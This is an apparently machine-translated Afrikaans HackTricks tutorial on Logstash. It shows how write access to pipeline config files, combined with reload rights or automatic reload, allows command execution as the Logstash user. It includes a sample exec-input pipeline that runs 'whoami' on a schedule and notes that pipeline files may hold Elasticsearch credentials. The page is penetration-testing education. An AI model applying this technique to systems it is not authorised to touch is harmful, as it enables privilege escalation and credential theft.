<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


## Logstash

Logstash word gebruik om **logs te versamel, transformeer en versprei** deur 'n stelsel wat bekend staan as **pipelines**. Hierdie pipelines bestaan uit **invoer**, **filter** en **uitvoer** fases. 'n Interessante aspek ontstaan wanneer Logstash op 'n gekompromitteerde masjien werk.

### Pipeline-konfigurasie

Pipelines word gekonfigureer in die lêer **/etc/logstash/pipelines.yml**, wat die plekke van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer onthul waar die **.conf** lêers, wat pyplynkonfigurasies bevat, geleë is. Wanneer 'n **Elasticsearch uitsetmodule** gebruik word, is dit algemeen dat **pyplyne** **Elasticsearch-legitimasie** insluit, wat dikwels uitgebreide voorregte het as gevolg van Logstash se behoefte om data na Elasticsearch te skryf. Wildcards in konfigurasiepaaie stel Logstash in staat om alle ooreenstemmende pyplyne in die aangewese gids uit te voer.

### Voorregverhoging deur Skryfbare Pyplyne

Om voorregverhoging te probeer, identifiseer eers die gebruiker waaronder die Logstash-diens gewoonlik loop, tipies die **logstash**-gebruiker. Maak seker dat jy aan **een** van hierdie kriteria voldoen:

- Besit **skryftoegang** tot 'n pyplyn **.conf** lêer **of**
- Die **/etc/logstash/pipelines.yml** lêer gebruik 'n wildcard, en jy kan na die teikengids skryf

Daarbenewens moet **een** van hierdie voorwaardes vervul word:

- Die vermoë om die Logstash-diens te herlaai **of**
- Die **/etc/logstash/logstash.yml** lêer het **config.reload.automatic: true** ingestel

Met 'n wildcard in die konfigurasie, maak dit moontlik om 'n lêer te skep wat ooreenstem met hierdie wildcard en sodoende opdraguitvoering toe te laat. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld word die **whoami**-opdrag elke 120 sekondes uitgevoer, met die uitvoer wat na **/tmp/output.log** gerig word.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, sal Logstash outomaties nuwe of gewysigde pyplynkonfigurasies opspoor en toepas sonder om 'n herlaaiing te benodig. As daar geen wildcards is nie, kan wysigings steeds aangebring word aan bestaande konfigurasies, maar voorsoorsigtigheid word aanbeveel om ontwrigting te voorkom.


## Verwysings

* [https://insinuator.net/2021/01/pentesting-the-elk-stack/](https://insinuator.net/2021/01/pentesting-the-elk-stack/)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
